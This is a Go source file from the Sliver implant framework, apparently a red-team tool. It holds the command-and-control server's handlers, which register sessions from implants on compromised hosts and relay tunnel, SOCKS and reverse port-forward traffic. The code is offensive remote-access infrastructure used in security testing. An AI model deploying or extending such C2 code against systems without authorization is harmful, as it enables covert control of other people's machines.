package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	------------------------------------------------------------------------

	WARNING: These functions can be invoked by remote implants without user interaction

*/

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/core/rtunnels"
	"github.com/bishopfox/sliver/server/log"

	"google.golang.org/protobuf/proto"

	"github.com/google/uuid"
)

var (
	sessionHandlerLog = log.NamedLogger("handlers", "sessions")
)

func registerSessionHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	if implantConn == nil {
		return nil
	}
	register := &sliverpb.Register{}
	err := proto.Unmarshal(data, register)
	if err != nil {
		sessionHandlerLog.Errorf("Error decoding session registration message: %s", err)
		return nil
	}

	session := core.NewSession(implantConn)

	// Parse Register UUID
	sessionUUID, err := uuid.Parse(register.Uuid)
	if err != nil {
		sessionUUID = uuid.New() // Generate Random UUID
	}
	session.Name = register.Name
	session.Hostname = register.Hostname
	session.UUID = sessionUUID.String()
	session.Username = register.Username
	session.UID = register.Uid
	session.GID = register.Gid
	session.OS = register.Os
	session.Arch = register.Arch
	session.PID = register.Pid
	session.Filename = register.Filename
	session.ActiveC2 = register.ActiveC2
	session.Version = register.Version
	session.ReconnectInterval = register.ReconnectInterval
	session.ProxyURL = register.ProxyURL
	session.Locale = register.Locale
	session.ConfigID = register.ConfigID
	session.PeerID = register.PeerID
	core.Sessions.Add(session)
	implantConn.Cleanup = func() {
		core.Sessions.Remove(session.ID)
	}
	go auditLogSession(session, register)
	return nil
}

type auditLogNewSessionMsg struct {
	Session  *clientpb.Session
	Register *sliverpb.Register
}

func auditLogSession(session *core.Session, register *sliverpb.Register) {
	msg, err := json.Marshal(auditLogNewSessionMsg{
		Session:  session.ToProtobuf(),
		Register: register,
	})
	if err != nil {
		sessionHandlerLog.Errorf("Failed to log new session to audit log %s", err)
	} else {
		log.AuditLogger.Warn(string(msg))
	}
}

// The handler mutex prevents a send on a closed channel, without it
// two handlers calls may race when a tunnel is quickly created and closed.
func tunnelDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)
	if session == nil {
		sessionHandlerLog.Warnf("Received tunnel data from unknown session: %v", implantConn)
		return nil
	}
	tunnelHandlerMutex.Lock()
	defer tunnelHandlerMutex.Unlock()
	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(data, tunnelData)

	sessionHandlerLog.Debugf("[DATA] Sequence on tunnel %d, %d, data: %s", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)

	rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)
	if rtunnel != nil && session.ID == rtunnel.SessionID {
		RTunnelDataHandler(tunnelData, rtunnel, implantConn)
	} else if rtunnel != nil && session.ID != rtunnel.SessionID {
		sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on reverse tunnel it did not own", session.ID)
	} else if rtunnel == nil && tunnelData.CreateReverse == true {
		createReverseTunnelHandler(implantConn, data)
		//RTunnelDataHandler(tunnelData, rtunnel, implantConn)
	} else {
		tunnel := core.Tunnels.Get(tunnelData.TunnelID)
		if tunnel != nil {
			if session.ID == tunnel.SessionID {
				tunnel.SendDataFromImplant(tunnelData)
			} else {
				sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)
			}
		} else {
			sessionHandlerLog.Warnf("Data sent on nil tunnel %d", tunnelData.TunnelID)
		}
	}

	return nil
}

func tunnelCloseHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)
	if session == nil {
		sessionHandlerLog.Warnf("Received tunnel close from unknown session: %v", implantConn)
		return nil
	}
	tunnelHandlerMutex.Lock()
	defer tunnelHandlerMutex.Unlock()

	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(data, tunnelData)
	sessionHandlerLog.Debugf("[CLOSE] Sequence on tunnel %d, %d, data: %s", tunnelData.TunnelID, tunnelData.Sequence, tunnelData.Data)
	if !tunnelData.Closed {
		return nil
	}
	tunnel := core.Tunnels.Get(tunnelData.TunnelID)
	if tunnel != nil {
		if session.ID == tunnel.SessionID {
			sessionHandlerLog.Infof("Closing tunnel %d", tunnel.ID)
			go core.Tunnels.ScheduleClose(tunnel.ID)
		} else {
			sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)
		}
	} else {
		rtunnel := rtunnels.GetRTunnel(tunnelData.TunnelID)
		if rtunnel != nil && session.ID == tunnel.SessionID {
			rtunnel.Close()
			rtunnels.RemoveRTunnel(rtunnel.ID)
		} else if rtunnel != nil && session.ID != tunnel.SessionID {
			sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on reverse tunnel it did not own", session.ID)
		} else {
			sessionHandlerLog.Warnf("Close sent on nil tunnel %d", tunnelData.TunnelID)
		}
	}
	return nil
}

func pingHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)
	if session == nil {
		sessionHandlerLog.Warnf("Received ping from unknown session: %v", implantConn)
		return nil
	}
	sessionHandlerLog.Debugf("ping from session %s", session.ID)
	return nil
}

func socksDataHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)
	if session == nil {
		sessionHandlerLog.Warnf("Received socks data from unknown session: %v", implantConn)
		return nil
	}
	tunnelHandlerMutex.Lock()
	defer tunnelHandlerMutex.Unlock()
	socksData := &sliverpb.SocksData{}

	proto.Unmarshal(data, socksData)
	//if socksData.CloseConn{
	//	core.SocksTunnels.Close(socksData.TunnelID)
	//	return nil
	//}
	sessionHandlerLog.Debugf("socksDataHandler:", len(socksData.Data), socksData.Data)
	socksTunnel := core.SocksTunnels.Get(socksData.TunnelID)
	if socksTunnel != nil {
		if session.ID == socksTunnel.SessionID {
			socksTunnel.FromImplant <- socksData
		} else {
			sessionHandlerLog.Warnf("Warning: Session %s attempted to send data on tunnel it did not own", session.ID)
		}
	} else {
		sessionHandlerLog.Warnf("Data sent on nil tunnel %d", socksData.TunnelID)
	}
	return nil
}

func createReverseTunnelHandler(implantConn *core.ImplantConnection, data []byte) *sliverpb.Envelope {
	session := core.Sessions.FromImplantConnection(implantConn)

	req := &sliverpb.TunnelData{}
	proto.Unmarshal(data, req)

	var defaultDialer = new(net.Dialer)

	remoteAddress := fmt.Sprintf("%s:%d", req.Rportfwd.Host, req.Rportfwd.Port)

	ctx, cancelContext := context.WithCancel(context.Background())

	dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
	//dst, err := net.Dial("tcp", remoteAddress)
	if err != nil {
		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: req.TunnelID,
		})
		implantConn.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
		cancelContext()
		return nil
	}

	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		//log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(1000 * time.Second)
	}

	tunnel := rtunnels.NewRTunnel(req.TunnelID, session.ID, dst, dst)
	rtunnels.AddRTunnel(tunnel)
	cleanup := func(reason error) {
		// {{if .Config.Debug}}
		sessionHandlerLog.Infof("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		tunnel := rtunnels.GetRTunnel(tunnel.ID)
		rtunnels.RemoveRTunnel(tunnel.ID)
		dst.Close()
		cancelContext()
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: implantConn,
		}
		// portfwd only uses one reader, hence the tunnel.Readers[0]
		n, err := io.Copy(tWriter, tunnel.Readers[0])
		_ = n // avoid not used compiler error if debug mode is disabled
		// {{if .Config.Debug}}
		sessionHandlerLog.Infof("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()

	tunnelDataCache.Add(tunnel.ID, req.Sequence, req)

	// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
	// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
	// is used here whereas WriteSequence is used for data written back to the server

	// Go through cache and write all sequential data to the reader
	for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
		// {{if .Config.Debug}}
		//sessionHandlerLog.Infof("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
		// {{end}}
		tunnel.Writer.Write(recv.Data)

		// Delete the entry we just wrote from the cache
		tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
		tunnel.IncReadSequence() // Increment sequence counter

		// {{if .Config.Debug}}
		//sessionHandlerLog.Infof("[message just received] %v", tunnelData)
		// {{end}}
	}

	//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
	//Send a Resend packet to have the msg resent from the cache
	if tunnelDataCache.Len(tunnel.ID) > 3 {
		data, err := proto.Marshal(&sliverpb.TunnelData{
			Sequence: tunnel.WriteSequence(), // The tunnel write sequence
			Ack:      tunnel.ReadSequence(),
			Resend:   true,
			TunnelID: tunnel.ID,
			Data:     []byte{},
		})
		if err != nil {
			// {{if .Config.Debug}}
			//sessionHandlerLog.Infof("[shell] Failed to marshal protobuf %s", err)
			// {{end}}
		} else {
			// {{if .Config.Debug}}
			//sessionHandlerLog.Infof("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
			// {{end}}
			implantConn.RequestResend(data)
		}
	}
	return nil
}

func RTunnelDataHandler(tunnelData *sliverpb.TunnelData, tunnel *rtunnels.RTunnel, connection *core.ImplantConnection) {

	// Since we have no guarantees that we will receive tunnel data in the correct order, we need
	// to ensure we write the data back to the reader in the correct order. The server will ensure
	// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
	// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
	// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
	// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
	// correctly write them back to the reader.

	// {{if .Config.Debug}}
	//sessionHandlerLog.Infof("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
	// {{end}}

	tunnelDataCache.Add(tunnel.ID, tunnelData.Sequence, tunnelData)

	// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
	// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
	// is used here whereas WriteSequence is used for data written back to the server

	// Go through cache and write all sequential data to the reader
	for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
		// {{if .Config.Debug}}
		//sessionHandlerLog.Infof("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
		// {{end}}
		tunnel.Writer.Write(recv.Data)

		// Delete the entry we just wrote from the cache
		tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
		tunnel.IncReadSequence() // Increment sequence counter

		// {{if .Config.Debug}}
		//sessionHandlerLog.Infof("[message just received] %v", tunnelData)
		// {{end}}
	}

	//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
	//Send a Resend packet to have the msg resent from the cache
	if tunnelDataCache.Len(tunnel.ID) > 3 {
		data, err := proto.Marshal(&sliverpb.TunnelData{
			Sequence: tunnel.WriteSequence(), // The tunnel write sequence
			Ack:      tunnel.ReadSequence(),
			Resend:   true,
			TunnelID: tunnel.ID,
			Data:     []byte{},
		})
		if err != nil {
			// {{if .Config.Debug}}
			//sessionHandlerLog.Infof("[shell] Failed to marshal protobuf %s", err)
			// {{end}}
		} else {
			// {{if .Config.Debug}}
			//sessionHandlerLog.Infof("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
			// {{end}}
			connection.RequestResend(data)
		}
	}
}
